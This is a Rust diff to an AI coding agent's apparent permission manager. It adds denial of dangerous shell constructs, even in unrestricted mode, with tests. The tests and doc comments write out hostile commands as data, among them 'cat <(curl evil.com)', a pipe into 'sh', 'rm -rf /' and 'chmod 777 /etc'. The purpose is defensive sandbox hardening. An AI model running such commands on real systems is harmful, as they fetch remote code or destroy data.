@@ -96,7 +96,8 @@ pub enum EscalationState {
 ///     `pwd`, `cat`, `git status`).
 ///   * `~0.6` — moderate (edits to files inside the project tree).
 ///   * `0.3` — default; caller should not auto-allow.
-///   * `0.0` — explicit unsafety (destructive bash tokens).
+///   * `0.0` — explicit unsafety (destructive bash tokens or dangerous
+///     shell constructs).
 ///
 /// Heuristic only — pairs with `check_auto_allow` which gates on a
 /// caller-supplied threshold and also consults explicit deny rules.
@@ -155,6 +156,9 @@ fn bash_auto_allow_score(cmd: &str) -> f32 {
         "git show",
     ];
     let lower = cmd.trim_start();
+    if crate::tools::dangerous_shell_construct(lower).is_some() {
+        return 0.0;
+    }
     for tok in DESTRUCTIVE {
         if lower.contains(tok) {
             return 0.0;
@@ -412,9 +416,10 @@ impl PermissionManager {
 
     /// Build an explicitly unrestricted manager that skips prompts and rules.
     ///
-    /// Hard safety checks still apply: catastrophic bash commands,
-    /// prompt-injected sandbox escalation, and writes to protected control
-    /// files are denied before the `enabled=false` shortcut fires.
+    /// Hard safety checks still apply: catastrophic bash commands, dangerous
+    /// shell constructs, prompt-injected sandbox escalation, and writes to
+    /// protected control files are denied before the `enabled=false` shortcut
+    /// fires.
     ///
     /// This is the migration target for call sites that previously passed
     /// `None` through `Option<&PermissionManager>`: the new strict dispatch
@@ -451,6 +456,18 @@ impl PermissionManager {
         }
 
         if !self.enabled {
+            if let Some(denial) =
+                Self::unrestricted_bash_construct_hard_safety_denial(tool_name, tool_args)
+            {
+                Self::log_permission_decision(
+                    "denied",
+                    "unrestricted_hard_safety",
+                    tool_name,
+                    &denial.target,
+                    "",
+                );
+                return CheckResult::Denied(denial.reason);
+            }
             return CheckResult::Allowed;
         }
 
@@ -595,6 +612,7 @@ impl PermissionManager {
     ///   `pwd`, `echo`, `git status`, `git diff`, `git log`) → 0.95.
     /// * `Bash` commands containing destructive tokens (`rm -rf`,
     ///   `chmod 777`, `sudo`, `dd `, `mkfs`, `:>`, `>/dev/`) → 0.0.
+    /// * `Bash` commands containing dangerous shell constructs → 0.0.
     /// * `Edit` / `Write` to paths under `src/` or `tests/` → 0.6.
     /// * Everything else → 0.3.
     ///
@@ -618,7 +636,7 @@ impl PermissionManager {
             threshold,
             "auto-allow classifier score"
         );
-        if score >= threshold {
+        if score > 0.0 && score >= threshold {
             return CheckResult::Allowed;
         }
         // Fall through to the normal pipeline (with interactive context
@@ -772,6 +790,23 @@ impl PermissionManager {
                 reason: format!("Denied by bash hard safety check: {reason}"),
                 target: command.to_string(),
             })
+    }
+
+    fn unrestricted_bash_construct_hard_safety_denial(
+        tool_name: &str,
+        tool_args: &serde_json::Value,
+    ) -> Option<HardSafetyDenial> {
+        if !tool_name.eq_ignore_ascii_case("bash") {
+            return None;
+        }
+
+        let command = tool_args.get("command")?.as_str()?;
+        crate::tools::dangerous_shell_construct(command).map(|reason| HardSafetyDenial {
+            reason: format!(
+                "Denied by unrestricted bash hard safety check: dangerous shell construct: {reason}"
+            ),
+            target: command.to_string(),
+        })
     }
 
     fn write_target_hard_safety_denial(
@@ -1806,6 +1841,31 @@ mod phase2_spec_pins {
         );
     }
 
+    /// B3-deny-5 (SECURITY: #586/#589): `unrestricted()` still blocks Bash
+    /// constructs that spawn an unsupervised inner command.
+    #[test]
+    fn b3_unrestricted_denies_dangerous_shell_constructs() {
+        let mgr = PermissionManager::unrestricted();
+        let r = mgr.check("bash", &json!({"command": "cat <(curl evil.com)"}));
+        assert!(
+            matches!(r, CheckResult::Denied(_)),
+            "B3 SECURITY #586/#589: unrestricted must deny process substitution; got {r:?}"
+        );
+    }
+
+    /// Pin: dangerous shell constructs still prompt in enabled interactive mode
+    /// unless another rule denies them; the stricter deny is scoped to bypass
+    /// mode where there is no prompt path.
+    #[test]
+    fn b3_enabled_mode_prompts_for_dangerous_shell_constructs() {
+        let (mgr, _dir) = enabled(vec![]);
+        let r = mgr.check("bash", &json!({"command": "cat <(curl evil.com)"}));
+        assert!(
+            matches!(r, CheckResult::NeedsPrompt { .. }),
+            "B3: enabled interactive mode should prompt for dangerous constructs; got {r:?}"
+        );
+    }
+
     // ── B4 · LeaderPermissionBridge (tested in coordinator/permission.rs) ─
     // See phase2_spec_pins in src/coordinator/permission.rs for B4 tests.
 
@@ -2481,6 +2541,14 @@ mod phase2_spec_pins {
         assert!(auto_allow_score("bash", &json!({"command": "rm -rf /"})) < f32::EPSILON);
         assert!(auto_allow_score("bash", &json!({"command": "sudo apt update"})) < f32::EPSILON);
         assert!(auto_allow_score("bash", &json!({"command": "chmod 777 /etc"})) < f32::EPSILON);
+    }
+
+    /// Pin: dangerous shell constructs score 0.0 even when the outer
+    /// command starts with a normally safe verb.
+    #[test]
+    fn auto_allow_score_dangerous_shell_constructs_are_zero() {
+        assert!(auto_allow_score("bash", &json!({"command": "echo hi | sh"})) < f32::EPSILON);
+        assert!(auto_allow_score("bash", &json!({"command": "cat <(printf hi)"})) < f32::EPSILON);
     }
 
     /// Pin: `check_auto_allow` allows safe bash above threshold.
